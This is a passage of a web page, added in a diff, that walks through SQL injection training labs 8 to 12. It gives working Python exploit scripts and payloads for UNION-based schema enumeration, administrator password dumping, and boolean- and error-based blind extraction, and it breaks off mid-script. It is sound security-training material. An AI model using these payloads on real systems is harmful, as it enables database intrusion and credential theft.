+          <span class="label">MySQL version via UNION</span>
+          <span class="injected">UNION SELECT @@version, NULL%23</span>
+          <br/>
+          <span class="normal" style="color:#5dffb2">→ 8.0.31-0ubuntu0.20.04.2</span>
+        </div>
+
+        <h3>The script</h3>
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">python</span>
+            <span class="code-block-label">sqli-lab-08.py</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code><span class="kw">import</span> requests
+<span class="kw">import</span> sys
+<span class="kw">import</span> urllib3
+<span class="kw">from</span> bs4 <span class="kw">import</span> BeautifulSoup
+<span class="kw">import</span> re
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies <span class="op">=</span> {<span class="str">'http'</span>: <span class="str">'http://127.0.0.1:8080'</span>, <span class="str">'https'</span>: <span class="str">'http://127.0.0.1:8080'</span>}
+
+<span class="kw">def</span> <span class="fn">exploit_sqli_version</span>(url):
+    path <span class="op">=</span> <span class="str">"/filter?category=Accessories"</span>
+    sql_payload <span class="op">=</span> <span class="str">"' UNION SELECT @@version, NULL%23"</span>
+    r <span class="op">=</span> requests.<span class="fn">get</span>(url <span class="op">+</span> path <span class="op">+</span> sql_payload, verify<span class="op">=</span><span class="kw">False</span>, proxies<span class="op">=</span>proxies)
+    soup <span class="op">=</span> <span class="cls">BeautifulSoup</span>(r.text, <span class="str">'html.parser'</span>)
+    version <span class="op">=</span> soup.<span class="fn">find</span>(text<span class="op">=</span>re.<span class="fn">compile</span>(<span class="str">'.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'</span>))
+    <span class="kw">if</span> version <span class="kw">is</span> <span class="kw">None</span>:
+        <span class="kw">return</span> <span class="kw">False</span>
+    <span class="fn">print</span>(<span class="str">"[+] The database version is: "</span> <span class="op">+</span> version)
+    <span class="kw">return</span> <span class="kw">True</span>
+
+<span class="kw">if</span> __name__ <span class="op">==</span> <span class="str">"__main__"</span>:
+    <span class="kw">try</span>:
+        url <span class="op">=</span> sys.argv[<span class="num">1</span>].strip()
+    <span class="kw">except</span> <span class="cls">IndexError</span>:
+        <span class="fn">print</span>(<span class="str">"[-] Usage: %s &lt;url&gt;"</span> <span class="op">%</span> sys.argv[<span class="num">0</span>])
+        sys.<span class="fn">exit</span>(<span class="op">-</span><span class="num">1</span>)
+
+    <span class="fn">print</span>(<span class="str">"[+] Dumping the version of the database..."</span>)
+    <span class="kw">if not</span> <span class="fn">exploit_sqli_version</span>(url):
+        <span class="fn">print</span>(<span class="str">"[-] Unable to dump the database version."</span>)</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">bash</span>
+            <span class="code-block-label">usage</span>
+          </div>
+          <pre><code>python sqli-lab-08.py https://&lt;lab-id&gt;.web-security-academy.net/</code></pre>
+        </div>
+
+        <h3>Script breakdown</h3>
+        <table class="breakdown">
+          <tr><th>line / concept</th><th>what it does and why</th></tr>
+          <tr>
+            <td>@@version</td>
+            <td>A MySQL/MSSQL global variable (note the double <code>@@</code>). Returns the full version string including build and OS details. This single variable works on both MySQL and SQL Server — making it a useful early probe before you've confirmed which one you're dealing with.</td>
+          </tr>
+          <tr>
+            <td>%23 comment</td>
+            <td><code>%23</code> is URL-encoded <code>#</code>. In MySQL, <code>#</code> starts a single-line comment, same as <code>--</code>. Using <code>%23</code> is important because if you paste a <code>#</code> directly in a URL query string, some servers or proxies will interpret it as a URL fragment separator and strip everything after it.</td>
+          </tr>
+          <tr>
+            <td>re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*')</td>
+            <td>Matches a semantic version pattern like <code>8.0.31</code>. A database-agnostic detection heuristic — if any text node in the page contains a version-like string, it's almost certainly the result of our <code>@@version</code> injection.</td>
+          </tr>
+        </table>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">🧠</div>
+          <div>
+            <div class="takeaway-title">What this lab teaches</div>
+            <div class="takeaway-text">MySQL and MSSQL share <code>@@version</code> syntax, which makes probing simpler than Oracle. The URL-encoding subtlety with <code>%23</code> vs <code>#</code> is also a useful thing to internalize — understanding how HTTP clients handle special characters in URLs is important when your payloads contain comment characters, quotes, or spaces.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider" />
+
+      <!-- ═══════════════════ LAB 9 ═══════════════════ -->
+      <div class="lab-section" id="lab9">
+        <div class="lab-header">
+          <div class="lab-num">09</div>
+          <div class="lab-header-text">
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-practitioner">Practitioner</span>
+            </div>
+            <h2 class="lab-title">SQL Injection — Listing Database Contents (Non-Oracle)</h2>
+            <div class="lab-goal">Goal: <span>Enumerate tables and columns via <code>information_schema</code>, then dump the administrator password</span></div>
+          </div>
+        </div>
+
+        <h3>information_schema: the attacker's map</h3>
+        <p>
+          <code>information_schema</code> is a standard SQL schema present in MySQL, PostgreSQL, and MSSQL (but not Oracle) that acts as a metadata catalog — it contains tables listing every table, every column, every constraint in the database. For an attacker who's achieved UNION injection, this is a complete map of the database.
+        </p>
+        <p>
+          The attack chain here is three steps: query <code>information_schema.tables</code> to find the users table name (which may be obfuscated), then query <code>information_schema.columns</code> to find the actual column names, then finally UNION SELECT the credentials directly.
+        </p>
+        <div class="vuln-query">
+          <span class="label">step 1 — enumerate tables</span>
+          <span class="injected">UNION SELECT table_name, NULL FROM information_schema.tables--</span>
+          <br/><br/>
+          <span class="label">step 2 — enumerate columns in the users table</span>
+          <span class="injected">UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--</span>
+          <br/><br/>
+          <span class="label">step 3 — dump credentials</span>
+          <span class="injected">UNION SELECT username, password FROM users--</span>
+        </div>
+
+        <h3>The script</h3>
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">python</span>
+            <span class="code-block-label">sqli-lab-09.py</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code><span class="kw">import</span> requests
+<span class="kw">import</span> sys
+<span class="kw">import</span> urllib3
+<span class="kw">from</span> bs4 <span class="kw">import</span> BeautifulSoup
+<span class="kw">import</span> re
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies <span class="op">=</span> {<span class="str">'http'</span>: <span class="str">'http://127.0.0.1:8080'</span>, <span class="str">'https'</span>: <span class="str">'http://127.0.0.1:8080'</span>}
+
+<span class="kw">def</span> <span class="fn">perform_request</span>(url, sql_payload):
+    path <span class="op">=</span> <span class="str">'/filter?category=Accessories'</span>
+    r <span class="op">=</span> requests.<span class="fn">get</span>(url <span class="op">+</span> path <span class="op">+</span> sql_payload, verify<span class="op">=</span><span class="kw">False</span>, proxies<span class="op">=</span>proxies)
+    <span class="kw">return</span> r.text
+
+<span class="kw">def</span> <span class="fn">sqli_users_table</span>(url):
+    sql_payload <span class="op">=</span> <span class="str">"' UNION SELECT table_name, NULL FROM information_schema.tables--"</span>
+    res <span class="op">=</span> <span class="fn">perform_request</span>(url, sql_payload)
+    soup <span class="op">=</span> <span class="cls">BeautifulSoup</span>(res, <span class="str">'html.parser'</span>)
+    users_table <span class="op">=</span> soup.<span class="fn">find</span>(text<span class="op">=</span>re.<span class="fn">compile</span>(<span class="str">'.*users.*'</span>))
+    <span class="kw">return</span> users_table <span class="kw">if</span> users_table <span class="kw">else</span> <span class="kw">False</span>
+
+<span class="kw">def</span> <span class="fn">sqli_users_columns</span>(url, users_table):
+    sql_payload <span class="op">=</span> <span class="str">"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '%s'--"</span> <span class="op">%</span> users_table
+    res <span class="op">=</span> <span class="fn">perform_request</span>(url, sql_payload)
+    soup <span class="op">=</span> <span class="cls">BeautifulSoup</span>(res, <span class="str">'html.parser'</span>)
+    username_column <span class="op">=</span> soup.<span class="fn">find</span>(text<span class="op">=</span>re.<span class="fn">compile</span>(<span class="str">'.*username.*'</span>))
+    password_column <span class="op">=</span> soup.<span class="fn">find</span>(text<span class="op">=</span>re.<span class="fn">compile</span>(<span class="str">'.*password.*'</span>))
+    <span class="kw">return</span> username_column, password_column
+
+<span class="kw">def</span> <span class="fn">sqli_administrator_cred</span>(url, users_table, username_column, password_column):
+    sql_payload <span class="op">=</span> <span class="str">"' UNION select %s, %s from %s--"</span> <span class="op">%</span> (username_column, password_column, users_table)
+    res <span class="op">=</span> <span class="fn">perform_request</span>(url, sql_payload)
+    soup <span class="op">=</span> <span class="cls">BeautifulSoup</span>(res, <span class="str">'html.parser'</span>)
+    admin_password <span class="op">=</span> soup.body.<span class="fn">find</span>(text<span class="op">=</span><span class="str">"administrator"</span>).parent.<span class="fn">findNext</span>(<span class="str">'td'</span>).contents[<span class="num">0</span>]
+    <span class="kw">return</span> admin_password
+
+<span class="kw">if</span> __name__ <span class="op">==</span> <span class="str">"__main__"</span>:
+    <span class="kw">try</span>:
+        url <span class="op">=</span> sys.argv[<span class="num">1</span>].strip()
+    <span class="kw">except</span> <span class="cls">IndexError</span>:
+        <span class="fn">print</span>(<span class="str">"[-] Usage: %s &lt;url&gt;"</span> <span class="op">%</span> sys.argv[<span class="num">0</span>])
+        sys.<span class="fn">exit</span>(<span class="op">-</span><span class="num">1</span>)
+
+    <span class="fn">print</span>(<span class="str">"Looking for a users table..."</span>)
+    users_table <span class="op">=</span> <span class="fn">sqli_users_table</span>(url)
+    <span class="kw">if</span> users_table:
+        <span class="fn">print</span>(<span class="str">"Found the users table: %s"</span> <span class="op">%</span> users_table)
+        username_column, password_column <span class="op">=</span> <span class="fn">sqli_users_columns</span>(url, users_table)
+        <span class="kw">if</span> username_column <span class="kw">and</span> password_column:
+            admin_password <span class="op">=</span> <span class="fn">sqli_administrator_cred</span>(url, users_table, username_column, password_column)
+            <span class="kw">if</span> admin_password:
+                <span class="fn">print</span>(<span class="str">"[+] The administrator password is: %s"</span> <span class="op">%</span> admin_password)</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">bash</span>
+            <span class="code-block-label">usage</span>
+          </div>
+          <pre><code>python sqli-lab-09.py https://&lt;lab-id&gt;.web-security-academy.net/</code></pre>
+        </div>
+
+        <h3>Script breakdown</h3>
+        <table class="breakdown">
+          <tr><th>line / concept</th><th>what it does and why</th></tr>
+          <tr>
+            <td>perform_request() helper</td>
+            <td>Factors out the repetitive request logic so each discovery function just passes a payload. Clean pattern — each function has one job: build a payload, parse the result, return the finding.</td>
+          </tr>
+          <tr>
+            <td>information_schema.tables</td>
+            <td>A standard metadata table available in MySQL, PostgreSQL, and MSSQL. Contains one row per table with columns including <code>table_name</code>, <code>table_schema</code>, and <code>table_type</code>. Querying it gives a complete list of every table the current user has access to.</td>
+          </tr>
+          <tr>
+            <td>re.compile('.*users.*')</td>
+            <td>Finds any table name containing "users" — the actual name might be randomized (e.g., <code>users_abcxyz</code>) in some lab variants. The regex handles this without needing an exact match.</td>
+          </tr>
+          <tr>
+            <td>Three-phase attack structure</td>
+            <td>Table name → column names → credentials. Each phase feeds the next. The final query uses the dynamically discovered names rather than assumptions. This is how a real blind enumeration would work against an unfamiliar target.</td>
+          </tr>
+        </table>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">🧠</div>
+          <div>
+            <div class="takeaway-title">What this lab teaches</div>
+            <div class="takeaway-text"><code>information_schema</code> is one of the most powerful things to know about for SQL injection. It effectively hands you a full blueprint of the database. The three-phase enumeration pattern (tables → columns → data) is a reusable template you'll use on practically every non-blind UNION injection from here on.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider" />
+
+      <!-- ═══════════════════ LAB 10 ═══════════════════ -->
+      <div class="lab-section" id="lab10">
+        <div class="lab-header">
+          <div class="lab-num">10</div>
+          <div class="lab-header-text">
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-practitioner">Practitioner</span>
+            </div>
+            <h2 class="lab-title">SQL Injection — Listing Database Contents (Oracle)</h2>
+            <div class="lab-goal">Goal: <span>Enumerate tables and columns via Oracle's <code>all_tables</code> / <code>all_tab_columns</code> views and dump admin credentials</span></div>
+          </div>
+        </div>
+
+        <h3>Oracle's equivalent of information_schema</h3>
+        <p>
+          Oracle doesn't have <code>information_schema</code>. Instead, it exposes schema metadata through its own family of catalog views: <code>all_tables</code> (tables accessible to the current user), <code>all_tab_columns</code> (columns in those tables), and <code>user_tables</code> / <code>dba_tables</code> for different privilege levels.
+        </p>
+        <p>
+          The logic is identical to Lab 9 — enumerate tables, then columns, then dump credentials — but the table names and column names in the metadata queries are different. In Oracle, the column is <code>table_name</code> in <code>all_tables</code>, and <code>column_name</code> in <code>all_tab_columns</code>. Oracle also tends to store names in uppercase, so <code>USERS_ABCDEF</code> instead of <code>users_abcdef</code>.
+        </p>
+        <div class="vuln-query">
+          <span class="label">Oracle — enumerate tables</span>
+          <span class="injected">UNION SELECT table_name, NULL FROM all_tables--</span>
+          <br/><br/>
+          <span class="label">Oracle — enumerate columns</span>
+          <span class="injected">UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--</span>
+        </div>
+
+        <h3>The script</h3>
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">python</span>
+            <span class="code-block-label">sqli-lab-10.py</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code><span class="kw">import</span> requests
+<span class="kw">import</span> sys
+<span class="kw">import</span> urllib3
+<span class="kw">from</span> bs4 <span class="kw">import</span> BeautifulSoup
+<span class="kw">import</span> re
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies <span class="op">=</span> {<span class="str">'http'</span>: <span class="str">'http://127.0.0.1:8080'</span>, <span class="str">'https'</span>: <span class="str">'http://127.0.0.1:8080'</span>}
+
+<span class="kw">def</span> <span class="fn">perform_request</span>(url, sql_payload):
+    path <span class="op">=</span> <span class="str">"/filter?category=Gifts"</span>
+    r <span class="op">=</span> requests.<span class="fn">get</span>(url <span class="op">+</span> path <span class="op">+</span> sql_payload, verify<span class="op">=</span><span class="kw">False</span>, proxies<span class="op">=</span>proxies)
+    <span class="kw">return</span> r.text
+
+<span class="kw">def</span> <span class="fn">sqli_users_table</span>(url):
+    sql_payload <span class="op">=</span> <span class="str">"' UNION SELECT table_name, NULL FROM all_tables--"</span>
+    res <span class="op">=</span> <span class="fn">perform_request</span>(url, sql_payload)
+    soup <span class="op">=</span> <span class="cls">BeautifulSoup</span>(res, <span class="str">'html.parser'</span>)
+    users_table <span class="op">=</span> soup.<span class="fn">find</span>(text<span class="op">=</span>re.<span class="fn">compile</span>(<span class="str">'^USERS\_.*'</span>))
+    <span class="kw">return</span> users_table
+
+<span class="kw">def</span> <span class="fn">sqli_users_columns</span>(url, users_table):
+    sql_payload <span class="op">=</span> <span class="str">"' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = '%s'-- "</span> <span class="op">%</span> users_table
+    res <span class="op">=</span> <span class="fn">perform_request</span>(url, sql_payload)
+    soup <span class="op">=</span> <span class="cls">BeautifulSoup</span>(res, <span class="str">'html.parser'</span>)
+    username_column <span class="op">=</span> soup.<span class="fn">find</span>(text<span class="op">=</span>re.<span class="fn">compile</span>(<span class="str">'.*USERNAME.*'</span>))
+    password_column <span class="op">=</span> soup.<span class="fn">find</span>(text<span class="op">=</span>re.<span class="fn">compile</span>(<span class="str">'.*PASSWORD.*'</span>))
+    <span class="kw">return</span> username_column, password_column
+
+<span class="kw">def</span> <span class="fn">sqli_administrator_cred</span>(url, users_table, username_column, password_column):
+    sql_payload <span class="op">=</span> <span class="str">"' UNION select %s, %s from %s--"</span> <span class="op">%</span> (username_column, password_column, users_table)
+    res <span class="op">=</span> <span class="fn">perform_request</span>(url, sql_payload)
+    soup <span class="op">=</span> <span class="cls">BeautifulSoup</span>(res, <span class="str">'html.parser'</span>)
+    admin_password <span class="op">=</span> soup.<span class="fn">find</span>(text<span class="op">=</span><span class="str">"administrator"</span>).parent.<span class="fn">findNext</span>(<span class="str">'td'</span>).contents[<span class="num">0</span>]
+    <span class="kw">return</span> admin_password
+
+<span class="kw">if</span> __name__ <span class="op">==</span> <span class="str">"__main__"</span>:
+    <span class="kw">try</span>:
+        url <span class="op">=</span> sys.argv[<span class="num">1</span>].strip()
+    <span class="kw">except</span> <span class="cls">IndexError</span>:
+        <span class="fn">print</span>(<span class="str">"[-] Usage: %s &lt;url&gt;"</span> <span class="op">%</span> sys.argv[<span class="num">0</span>])
+        sys.<span class="fn">exit</span>(<span class="op">-</span><span class="num">1</span>)
+
+    <span class="fn">print</span>(<span class="str">"Looking for the users table..."</span>)
+    users_table <span class="op">=</span> <span class="fn">sqli_users_table</span>(url)
+    <span class="kw">if</span> users_table:
+        <span class="fn">print</span>(<span class="str">"Found: %s"</span> <span class="op">%</span> users_table)
+        username_column, password_column <span class="op">=</span> <span class="fn">sqli_users_columns</span>(url, users_table)
+        <span class="kw">if</span> username_column <span class="kw">and</span> password_column:
+            admin_password <span class="op">=</span> <span class="fn">sqli_administrator_cred</span>(url, users_table, username_column, password_column)
+            <span class="kw">if</span> admin_password:
+                <span class="fn">print</span>(<span class="str">"[+] The administrator password is: %s"</span> <span class="op">%</span> admin_password)</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">bash</span>
+            <span class="code-block-label">usage</span>
+          </div>
+          <pre><code>python sqli-lab-10.py https://&lt;lab-id&gt;.web-security-academy.net/</code></pre>
+        </div>
+
+        <h3>Script breakdown</h3>
+        <table class="breakdown">
+          <tr><th>line / concept</th><th>what it does and why</th></tr>
+          <tr>
+            <td>all_tables vs information_schema.tables</td>
+            <td><code>all_tables</code> is Oracle's equivalent — it returns all tables accessible to the current session. <code>dba_tables</code> would return everything in the database, but requires DBA privileges. <code>user_tables</code> returns only tables owned by the current user.</td>
+          </tr>
+          <tr>
+            <td>all_tab_columns</td>
+            <td>Oracle's equivalent of <code>information_schema.columns</code>. The column is still called <code>column_name</code>, but the table name filter uses <code>table_name</code> (uppercase). The WHERE clause <code>table_name = 'USERS_ABCDEF'</code> must exactly match Oracle's uppercase naming.</td>
+          </tr>
+          <tr>
+            <td>re.compile('^USERS\_.*')</td>
+            <td>The <code>^</code> anchors to the start of the text node. Oracle stores table names in uppercase — the regex matches any name starting with "USERS_". The backslash escapes the underscore so it's treated as a literal character, not a single-char wildcard (though in Python regex, <code>_</code> doesn't need escaping — it's a defensive habit).</td>
+          </tr>
+        </table>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">🧠</div>
+          <div>
+            <div class="takeaway-title">What this lab teaches</div>
+            <div class="takeaway-text">The structural attack pattern is identical to Lab 9 — only the metadata table names change. This reinforces the value of database fingerprinting first: once you know it's Oracle, you know to use <code>all_tables</code> / <code>all_tab_columns</code> and expect uppercase names. The script structure here is a good template to adapt for any UNION-capable database.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider" />
+
+      <!-- ═══════════════════ LAB 11 ═══════════════════ -->
+      <div class="lab-section" id="lab11">
+        <div class="lab-header">
+          <div class="lab-num">11</div>
+          <div class="lab-header-text">
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-practitioner">Practitioner</span>
+            </div>
+            <h2 class="lab-title">Blind SQLi — Conditional Responses</h2>
+            <div class="lab-goal">Goal: <span>Extract the administrator password one character at a time by observing whether a "Welcome back" message appears in the response</span></div>
+          </div>
+        </div>
+
+        <h3>What is blind SQL injection?</h3>
+        <p>
+          All the labs so far have been <strong>in-band</strong> (or visible) injection — the query results were reflected directly into the page HTML. Blind SQLi is fundamentally different: the application doesn't return query data in the response at all. Instead, you infer information from <em>how</em> the application responds.
+        </p>
+        <p>
+          In a <strong>boolean-based blind</strong> attack, you craft a query that evaluates to true or false, and observe a binary difference in the application's response. Here, the difference is whether "Welcome back" appears or not. By asking questions like "is the first character of the password greater than 'm'?" and watching the response, you can extract the entire password — one bit of information per request.
+        </p>
+        <div class="vuln-query">
+          <span class="label">boolean blind payload — character extraction</span>
+          <span class="injected">' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='administrator')='97'--</span>
+          <br/>
+          <span class="normal" style="color:#5dffb2">→ if "Welcome back" appears, first char is ASCII 97 ('a')</span>
+        </div>
+        <p>
+          The script iterates this over all 20 character positions and ASCII values 32–125, making up to 1880 requests to extract a 20-character password. This is brute force — slow but reliable.
+        </p>
+
+        <div class="callout warning">
+          <div class="callout-title">⚠️ Hardcoded cookies</div>
+          <p>This script uses hardcoded <code>TrackingId</code> and <code>session</code> cookie values — they're specific to a single lab instance. Each time you spin up a new lab, you need to update these values from your browser session or Burp Suite before running the script.</p>
+        </div>
+
+        <h3>The script</h3>
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">python</span>
+            <span class="code-block-label">sqli-lab-11.py</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code><span class="kw">import</span> sys
+<span class="kw">import</span> requests
+<span class="kw">import</span> urllib3
+<span class="kw">import</span> urllib
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies <span class="op">=</span> {<span class="str">'http'</span>: <span class="str">'http://127.0.0.1:8080'</span>, <span class="str">'https'</span>: <span class="str">'http://127.0.0.1:8080'</span>}
+
+<span class="kw">def</span> <span class="fn">sqli_password</span>(url):
+    password_extracted <span class="op">=</span> <span class="str">""</span>
+    <span class="kw">for</span> i <span class="kw">in</span> <span class="fn">range</span>(<span class="num">1</span>, <span class="num">21</span>):
+        <span class="kw">for</span> j <span class="kw">in</span> <span class="fn">range</span>(<span class="num">32</span>, <span class="num">126</span>):
+            sqli_payload <span class="op">=</span> <span class="str">"' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--"</span> <span class="op">%</span> (i, j)
+            sqli_payload_encoded <span class="op">=</span> urllib.parse.<span class="fn">quote</span>(sqli_payload)
+            cookies <span class="op">=</span> {<span class="str">'TrackingId'</span>: <span class="str">'dCqiyv8E4BfhhpHL'</span> <span class="op">+</span> sqli_payload_encoded, <span class="str">'session'</span>: <span class="str">'bdb4dZfXEcfucciq98jCIYBJW4NL7y7M'</span>}
+            r <span class="op">=</span> requests.<span class="fn">get</span>(url, cookies<span class="op">=</span>cookies, verify<span class="op">=</span><span class="kw">False</span>, proxies<span class="op">=</span>proxies)
+            <span class="kw">if</span> <span class="str">"Welcome"</span> <span class="kw">not in</span> r.text:
+                sys.stdout.<span class="fn">write</span>(<span class="str">'\r'</span> <span class="op">+</span> password_extracted <span class="op">+</span> <span class="fn">chr</span>(j))
+                sys.stdout.<span class="fn">flush</span>()
+            <span class="kw">else</span>:
+                password_extracted <span class="op">+=</span> <span class="fn">chr</span>(j)
+                sys.stdout.<span class="fn">write</span>(<span class="str">'\r'</span> <span class="op">+</span> password_extracted)
+                sys.stdout.<span class="fn">flush</span>()
+                <span class="kw">break</span>
+
+<span class="kw">def</span> <span class="fn">main</span>():
+    <span class="kw">if</span> <span class="fn">len</span>(sys.argv) <span class="op">!=</span> <span class="num">2</span>:
+        <span class="fn">print</span>(<span class="str">"(+) Usage: %s &lt;url&gt;"</span> <span class="op">%</span> sys.argv[<span class="num">0</span>])
+        sys.<span class="fn">exit</span>(<span class="op">-</span><span class="num">1</span>)
+    url <span class="op">=</span> sys.argv[<span class="num">1</span>]
+    <span class="fn">print</span>(<span class="str">"(+) Retrieving administrator password..."</span>)
+    <span class="fn">sqli_password</span>(url)
+
+<span class="kw">if</span> __name__ <span class="op">==</span> <span class="str">"__main__"</span>:
+    <span class="fn">main</span>()</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">bash</span>
+            <span class="code-block-label">usage</span>
+          </div>
+          <pre><code>python sqli-lab-11.py https://&lt;lab-id&gt;.web-security-academy.net/</code></pre>
+        </div>
+
+        <h3>Script breakdown</h3>
+        <table class="breakdown">
+          <tr><th>line / concept</th><th>what it does and why</th></tr>
+          <tr>
+            <td>range(1,21) outer loop</td>
+            <td>Iterates over character positions 1 through 20 — the assumed maximum password length. <code>SUBSTRING(password, i, 1)</code> extracts a single character at position <code>i</code>.</td>
+          </tr>
+          <tr>
+            <td>range(32,126) inner loop</td>
+            <td>Iterates over the printable ASCII range. 32 is space, 126 is tilde <code>~</code>. Passwords typically use alphanumeric chars plus punctuation, all of which fall within this range.</td>
+          </tr>
+          <tr>
+            <td>ASCII() + SUBSTRING()</td>
+            <td><code>ASCII()</code> converts a character to its numeric code. Comparing numbers is more reliable than comparing character strings directly (avoids case-sensitivity issues on some databases). When ASCII code matches <code>j</code>, we convert back with Python's <code>chr(j)</code>.</td>
+          </tr>
+          <tr>
+            <td>urllib.parse.quote()</td>
+            <td>URL-encodes the payload before appending it to the cookie value. Without this, special characters like spaces, quotes, and equals signs would corrupt the cookie header and cause request failures.</td>
+          </tr>
+          <tr>
+            <td>sys.stdout.write + flush</td>
+            <td>Writes to stdout without a newline and immediately flushes the buffer. Combined with <code>\r</code> (carriage return), this creates a live updating display — you see the password being discovered character by character in real time.</td>
+          </tr>
+          <tr>
+            <td>Cookie-based injection</td>
+            <td>The injection point here is the <code>TrackingId</code> cookie, not a URL parameter or form field. This is an important reminder: any value the server reads into a SQL query is a potential injection point — not just visible form inputs.</td>
+          </tr>
+        </table>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">🧠</div>
+          <div>
+            <div class="takeaway-title">What this lab teaches</div>
+            <div class="takeaway-text">Boolean-based blind SQLi is slower and noisier than in-band injection, but it works when no data is reflected in the response. The key mental model: you're not reading data, you're asking yes/no questions. Any binary observable difference in application behavior — presence of a word, HTTP status code, response length — can be your oracle. This is foundational for understanding tools like sqlmap's blind modes.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider" />
+
+      <!-- ═══════════════════ LAB 12 ═══════════════════ -->
+      <div class="lab-section" id="lab12">
+        <div class="lab-header">
+          <div class="lab-num">12</div>
+          <div class="lab-header-text">
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-practitioner">Practitioner</span>
+            </div>
+            <h2 class="lab-title">Blind SQLi — Conditional Errors</h2>
+            <div class="lab-goal">Goal: <span>Extract the admin password by triggering database errors on true conditions — when no visual difference exists between true and false responses</span></div>
+          </div>
+        </div>
+
+        <h3>When there's no "Welcome back" to observe</h3>
+        <p>
+          Sometimes an application is so well-hardened that it returns identical responses for both true and false conditions — no conditional message, no content difference whatsoever. Boolean-based blind SQLi fails here. The solution: make the database <em>error</em> on purpose when a condition is true.
+        </p>
+        <p>
+          In Oracle, the expression <code>TO_CHAR(1/0)</code> causes a divide-by-zero error. By placing it inside a <code>CASE WHEN</code> — only evaluated when the condition is true — you can turn a true/false result into a 200 response vs. a 500 response. The server always returns a 500 on a database error, which is your oracle.
+        </p>
+        <div class="vuln-query">
+          <span class="label">error-based blind payload (Oracle)</span>
+          <span class="injected">' || (SELECT CASE WHEN (ascii(substr(password,1,1))='97') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '</span>
+          <br/>
+          <span class="normal" style="color:#ff6b6b">→ 500 error = condition true (char is 'a')</span>
+          <br/>
+          <span class="normal" style="color:#5dffb2">→ 200 OK = condition false</span>
+        </div>
+        <p>
+          Note the <code>|| '</code> at the end — this closes the string concatenation that started in the cookie value, keeping the overall SQL syntax valid when the CASE returns an empty string.
+        </p>
+
+        <h3>The script</h3>
+        <div class="code-block">
+          <div class="code-block-header">
+            <span class="code-block-lang">python</span>
+            <span class="code-block-label">sqli-lab-12.py</span>
+            <button class="copy-btn" onclick="copyCode(this)">copy</button>
+          </div>
+          <pre><code><span class="kw">import</span> sys
+<span class="kw">import</span> requests
+<span class="kw">import</span> urllib3
+<span class="kw">import</span> urllib.parse
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies <span class="op">=</span> {<span class="str">'http'</span>: <span class="str">'http://127.0.0.1:8080'</span>, <span class="str">'https'</span>: <span class="str">'http://127.0.0.1:8080'</span>}
+
+<span class="kw">def</span> <span class="fn">sqli_password</span>(url):
+    password_extracted <span class="op">=</span> <span class="str">""</span>
+    <span class="kw">for</span> i <span class="kw">in</span> <span class="fn">range</span>(<span class="num">1</span>, <span class="num">21</span>):
+        <span class="kw">for</span> j <span class="kw">in</span> <span class="fn">range</span>(<span class="num">32</span>, <span class="num">126</span>):
+            sqli_payload <span class="op">=</span> <span class="str">"' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '"</span> <span class="op">%</span> (i, j)
+            sqli_payload_encoded <span class="op">=</span> urllib.parse.<span class="fn">quote</span>(sqli_payload)
+            cookies <span class="op">=</span> {<span class="str">'TrackingId'</span>: <span class="str">'FGDUewi6MoAn18KJ'</span> <span class="op">+</span> sqli_payload_encoded, <span class="str">'session'</span>: <span class="str">'VdmCjrlz6I6zAXGXEp2u32p0OXKDGhm2'</span>}
+            r <span class="op">=</span> requests.<span class="fn">get</span>(url, cookies<span class="op">=</span>cookies, verify<span class="op">=</span><span class="kw">False</span>, proxies<span class="op">=</span>proxies)
+            <span class="kw">if</span> r.status_code <span class="op">==</span> <span class="num">500</span>:
+                password_extracted <span class="op">+=</span> <span class="fn">chr</span>(j)
+                sys.stdout.<span class="fn">write</span>(<span class="str">'\r'</span> <span class="op">+</span> password_extracted)
+                sys.stdout.<span class="fn">flush</span>()
+                <span class="kw">break</span>
+            <span class="kw">else</span>:
+                sys.stdout.<span class="fn">write</span>(<span class="str">'\r'</span> <span class="op">+</span> password_extracted <span class="op">+</span> <span class="fn">chr</span>(j))
